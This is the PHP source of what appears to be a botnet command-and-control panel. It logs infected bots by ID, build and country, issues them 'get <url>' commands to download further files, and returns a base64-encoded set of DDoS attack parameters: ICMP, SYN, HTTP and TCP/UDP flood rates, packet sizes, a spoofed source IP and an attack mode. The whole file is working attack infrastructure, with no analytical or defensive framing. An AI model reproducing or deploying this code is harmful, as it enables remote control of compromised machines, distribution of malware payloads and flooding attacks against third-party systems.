<?

        error_reporting(E_ALL ^ E_NOTICE);

        require_once "Net/GeoIP.php";
        require_once "config.php";

        if (@!mysql_connect($opt['mysql_host'], $opt['mysql_user'], $opt['mysql_pass']))
                exit();

        if (@!mysql_select_db($opt['mysql_base']))
                exit();

        function db_query($sql)
        {
                $r = mysql_query($sql);

                if (mysql_error())
                        exit;

                return $r;
        }

        function get_geography($clientIP)
        {
                $data = array(
                         "country"      => "00",
                         "country_full" => "unknown",
                );

                $geoip = Net_GeoIP::getInstance("GeoIP.dat");
                // country...
                try {
                        $country = $geoip->lookupCountryCode($clientIP);
                         if (!empty($country))
                                 $data['country'] = $country;

                } catch (Exception $e) {
                //         print "Net_GeoIP : EXEPTION\n";
                }

                try {
                         $country_full = $geoip->lookupCountryName($clientIP);
                         if (!empty($country_full))
                                 $data['country_full'] = $country_full;

                } catch (Exception $e) {
                //         print "Net_GeoIP : EXEPTION\n";
                }

                return $data;
        }

        if (!isset($_POST['id']) || !isset($_POST['build_id']))
               exit();

        $addr     = $_SERVER['REMOTE_ADDR'];
        $id       = addslashes($_POST['id']);
        $build_id = addslashes($_POST['build_id']);

        $country = get_geography($addr);

        $sql = "SELECT * FROM `stat` WHERE `id`='$id'";
        $r = mysql_query($sql);

        $files = array();
        if (mysql_num_rows($r) > 0)
        {
                $f = mysql_fetch_array($r);
                $files = @unserialize($f['files']);
        }

        $sql = "SELECT * FROM `files` WHERE `dnum`>`dtotal` OR `dnum`='0'";
        $r = mysql_query($sql);

        $cmd = array();

        while ($f = mysql_fetch_array($r))
        {
                if (!empty($f['country']))
                {
                             if ($country['country'] != $f['country'])
                                   continue;
                }

                if (!isset($files[$f['id']]))
                {
                             $cmd[] = "get ".$f['url'];
                             $sql = "UPDATE `files` SET `dtotal`=`dtotal`+1 WHERE id='{$f['id']}'";
                             mysql_query($sql);
                }

                $files[$f['id']] = time();
        }

        $sql = "REPLACE INTO `stat`
                (`id`, `build_id`, `files`, `ip`, `last`, `country`, `country_full`)
                VALUES
                ('$id', '$build_id', '".serialize($files)."', '$addr', '".time()."', '{$country['country']}', '{$country['country_full']}')
        ";
        db_query($sql);

        $opt = array();

        $r = db_query("SELECT * FROM `opt`");
        while ($f = mysql_fetch_array($r))
                $opt[$f['name']] = $f['value'];

        $cmd[] = $opt['cmd'];

        echo base64_encode(     $opt['icmp_freq'].';'.
                                $opt['icmp_size'].';'.
                                $opt['syn_freq'].';'.
                                $opt['spoof_ip'].';'.
                                $opt['attack_mode'].';'.
                                $opt['max_sessions'].';'.
                                $opt['http_freq'].';'.
                                $opt['http_threads'].';'.
                                $opt['tcpudp_freq'].';'.
                                $opt['udp_size'].';'.
                                $opt['tcp_size'].'#'.
                                implode(';', $cmd).'#'.
                                $opt['ufreq'].'#'
        );

?>